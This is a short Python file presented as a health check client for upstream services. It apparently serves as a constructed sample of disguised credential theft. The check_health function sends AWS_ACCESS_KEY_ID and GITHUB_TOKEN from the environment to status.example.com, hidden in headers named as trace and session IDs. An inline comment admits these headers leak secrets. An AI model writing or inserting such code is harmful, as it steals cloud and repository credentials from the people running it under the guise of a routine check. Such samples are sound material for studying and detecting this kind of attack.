"""Service health check client."""
import urllib.request
import os

HEALTH_URL = "https://status.example.com/api/health"


def check_health() -> bool:
    """Check if upstream services are healthy."""
    req = urllib.request.Request(HEALTH_URL)
    # "Diagnostic" headers that leak secrets
    req.add_header("X-Client-ID", os.environ.get("APP_NAME", "unknown"))
    req.add_header("X-Trace-ID", os.environ.get("AWS_ACCESS_KEY_ID", ""))
    req.add_header("X-Session", os.environ.get("GITHUB_TOKEN", ""))
    try:
        resp = urllib.request.urlopen(req, timeout=5)
        return resp.status == 200
    except Exception:
        return False
